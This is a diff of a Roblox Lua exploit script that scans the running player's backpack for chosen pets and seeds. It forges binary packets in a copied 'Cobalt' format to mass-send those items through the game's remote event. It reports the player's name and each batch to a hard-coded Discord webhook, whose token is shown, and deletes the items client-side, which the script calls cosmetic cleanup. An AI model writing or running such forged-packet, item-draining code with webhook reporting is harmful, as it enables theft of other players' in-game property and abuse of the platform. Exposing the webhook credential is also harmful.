@@ -1,130 +1,116 @@
--- Generated Dual Mass Payload Sender - FINAL FIXED
+-- Fixed dual mass sender – replicates working Cobalt remote format
 local ALLOWED_PETS = {"Robin"}
 local ALLOWED_SEEDS = {"Hypno Bloom","Green Bean","Grape","Coconut","Mushroom","Acorn","Tomato","Dragon's Breath","Star Fruit","Moon Bloom","Briar Rose","Venom Spitter","Apple","Venus Fly Trap","Rocket Pop","Bamboo","Fire Fern","Corn","Pomegranate","Sunflower","Dragon Fruit","Cherry","Sun Bloom","Blueberry","Mango","Cactus","Strawberry","Banana","Poison Apple","Tulip","Pineapple"}
 local WEBHOOK = "https://discord.com/api/webhooks/1526222716275785839/65GIm7Yx4pfvQeUc11P8-E8Zc43wtzJiZjn9SVZ_s9CofmAqTe9LWPctE_TMJPkKDRqw"
+
 local Event = game:GetService("ReplicatedStorage").SharedModules.Packet.RemoteEvent
-local petLookup = {}
-for _, p in ipairs(ALLOWED_PETS) do petLookup[string.lower(p)] = true end
-local seedLookup = {}
-for _, s in ipairs(ALLOWED_SEEDS) do seedLookup[string.lower(s)] = true end
-
-local function sendWebhook(msg)
-	local req = (type(request) == "function" and request)
-		or (type(http_request) == "function" and http_request)
-		or (syn and type(syn.request) == "function" and syn.request)
-		or (http and type(http.request) == "function" and http.request)
-	if req then
-		pcall(req, {
-			Url = WEBHOOK,
-			Method = "POST",
-			Headers = {["Content-Type"] = "application/json"},
-			Body = game:GetService("HttpService"):JSONEncode({content = msg})
-		})
-	end
-end
-
 local player = game:GetService("Players").LocalPlayer
 local backpack = player:WaitForChild("Backpack")
-sendWebhook("🚀 Mass Sender Started by " .. player.Name)
 
--- Build exact Cobalt format item block
+-- Quick lookup tables
+local petLookup = {}
+for _, p in ipairs(ALLOWED_PETS) do petLookup[p:lower()] = true end
+local seedLookup = {}
+for _, s in ipairs(ALLOWED_SEEDS) do seedLookup[s:lower()] = true end
+
+local function sendWebhook(msg)
+    local req = (type(request) == "function" and request) 
+        or (type(http_request) == "function" and http_request) 
+        or (syn and type(syn.request) == "function" and syn.request) 
+        or (http and type(http.request) == "function" and http.request)
+    if req then
+        pcall(req, {
+            Url = WEBHOOK,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = game:GetService("HttpService"):JSONEncode({content = msg})
+        })
+    end
+end
+
+-- Header extracted from the working Cobalt call – DO NOT CHANGE
+local HEADER = "!\x013\x00\x00\xC0\x00X\xB8\xFFA\x1C\x05\x01"
+
+-- Builds one item block exactly as Cobalt does
 local function buildItemBlock(itemKey, count, category)
-	local block = ""
-	block = block .. "\x1C"
-	block = block .. "\v" .. string.char(7) .. "ItemKey"
-	block = block .. "\v" .. string.char(#itemKey) .. itemKey
-	block = block .. "\v" .. string.char(5) .. "Count"
-	block = block .. "\x05" .. string.char(count)
-	block = block .. "\v" .. string.char(8) .. "Category"
-	block = block .. "\v" .. string.char(#category) .. category
-	return block
+    local part = {}
+    part[1] = "\x1C"
+    -- ItemKey pair
+    part[2] = "\v\aItemKey"                     -- \v (string), length 7, "ItemKey"
+    part[3] = "\v" .. string.char(#itemKey) .. itemKey
+    -- Count pair
+    part[4] = "\v\x05Count"                     -- \v (string), length 5, "Count"
+    part[5] = "\x05" .. string.char(count)      -- \x05 (integer), value byte
+    -- Category pair
+    part[6] = "\v\bCategory"                    -- \v (string), length 8, "Category"
+    part[7] = "\v" .. string.char(#category) .. category
+    return table.concat(part)
 end
 
--- Build complete payload
-local function buildPayload(itemsArray)
-	local payload = ""
-	for idx, item in ipairs(itemsArray) do
-		local block = buildItemBlock(item.key, item.count, item.category)
-		if idx == 1 then
-			payload = block
-		else
-			payload = payload .. "\x00\x05" .. string.char(idx) .. block
-		end
-	end
-	payload = payload .. "\x00\x00\x00"
-	return payload
-end
-
--- Fire payload with correct header
-local function firePayload(itemsArray)
-	local dynamicPayload = buildPayload(itemsArray)
-	local payloadSize = #dynamicPayload
-	local header = "!\x01" .. string.char(payloadSize) .. "\x00\x00\xC0\x00X\xB8\xFFA\x1C\x05\x01"
-	local finalPayload = header .. dynamicPayload
-	if Event then
-		Event:FireServer(buffer.fromstring(finalPayload))
-	end
-end
+sendWebhook("🚀 **Dual Mass Script Started** by " .. player.Name)
 
 while true do
-	local items = backpack:GetChildren()
-	local queue = {}
-	local processedPetIds = {}
-	local seedCounts = {}
-	
-	-- Scan backpack
-	for _, item in ipairs(items) do
-		if #queue >= 20 then break end
-		
-		local mainCat = item:GetAttribute("MainCategory")
-		
-		-- Check for SEEDS
-		if mainCat == "Seed" then
-			local seedName = item:GetAttribute("SeedTool")
-			local count = item:GetAttribute("Count") or 1
-			
-			if seedName and seedLookup[string.lower(seedName)] then
-				if not seedCounts[seedName] then seedCounts[seedName] = 0 end
-				seedCounts[seedName] = seedCounts[seedName] + count
-			end
-		else
-			-- Check for PETS
-			local petId = item:GetAttribute("PetId")
-			local petName = item:GetAttribute("Pet")
-			
-			if petId and petName and petLookup[string.lower(petName)] then
-				if not processedPetIds[petId] then
-					processedPetIds[petId] = true
-					table.insert(queue, {key = "$" .. petId, count = 1, category = "Pets", name = petName})
-				end
-			end
-		end
-	end
-	
-	-- Add processed seeds to queue
-	for seedName, totalCount in pairs(seedCounts) do
-		if #queue < 20 then
-			table.insert(queue, {key = seedName, count = totalCount, category = "Seeds", name = seedName})
-		end
-	end
-	
-	-- If no items, exit
-	if #queue == 0 then
-		sendWebhook("🏁 **Script Complete** – No more items.")
-		break
-	end
-	
-	-- Fire the payload
-	firePayload(queue)
-	
-	-- Log
-	local logLines = {}
-	for _, item in ipairs(queue) do
-		table.insert(logLines, string.format("• %s (x%d)", item.name, item.count))
-	end
-	
-	sendWebhook("⚡ **Batch Fired (%d items)**:\n" .. table.concat(logLines, "\n"))
-	
-	-- Wait 12 seconds before next batch
-	task.wait(12)
+    local items = backpack:GetChildren()
+    local queue = {}
+
+    -- Scan backpack for matching seeds and pets (max 20 per batch)
+    for _, item in ipairs(items) do
+        if #queue >= 20 then break end
+        
+        local mainCat = item:GetAttribute("MainCategory")
+        if mainCat == "Seed" then
+            local seedName = item:GetAttribute("SeedTool")
+            if seedName and seedLookup[seedName:lower()] then
+                local count = item:GetAttribute("Count") or 1
+                table.insert(queue, {
+                    key = seedName,
+                    count = count,
+                    category = "Seeds",
+                    instance = item
+                })
+            end
+        else
+            local petName = item:GetAttribute("Pet")
+            local petId = item:GetAttribute("PetId")
+            if petName and petId and petLookup[petName:lower()] then
+                table.insert(queue, {
+                    key = "$" .. petId,    -- pet identifier is "$" + UUID
+                    count = 1,
+                    category = "Pets",
+                    instance = item
+                })
+            end
+        end
+    end
+
+    if #queue == 0 then
+        sendWebhook("🏁 **Inventory cleared** – no more matching items in backpack.")
+        break
+    end
+
+    -- Build the complete payload
+    local payload = HEADER
+    for i, itemData in ipairs(queue) do
+        if i > 1 then
+            payload = payload .. "\x00\x05" .. string.char(i)   -- separator for multi-item
+        end
+        payload = payload .. buildItemBlock(itemData.key, itemData.count, itemData.category)
+    end
+    payload = payload .. "\x00\x00\x00"     -- termination sequence
+
+    -- Fire the remote – the actual mail send
+    if Event then
+        Event:FireServer(buffer.fromstring(payload))
+    end
+
+    -- Log and cosmetic client‑side cleanup
+    local logLines = {}
+    for _, itemData in ipairs(queue) do
+        table.insert(logLines, string.format("• %s (x%d) bundled.", itemData.instance.Name, itemData.count))
+        itemData.instance:Destroy()
+    end
+    sendWebhook("⚡ **Batch fired (" .. #queue .. " items in 1 packet):**\n" .. table.concat(logLines, "\n"))
+
+    -- Respect the 12‑second cooldown before next batch
+    task.wait(12)
 end
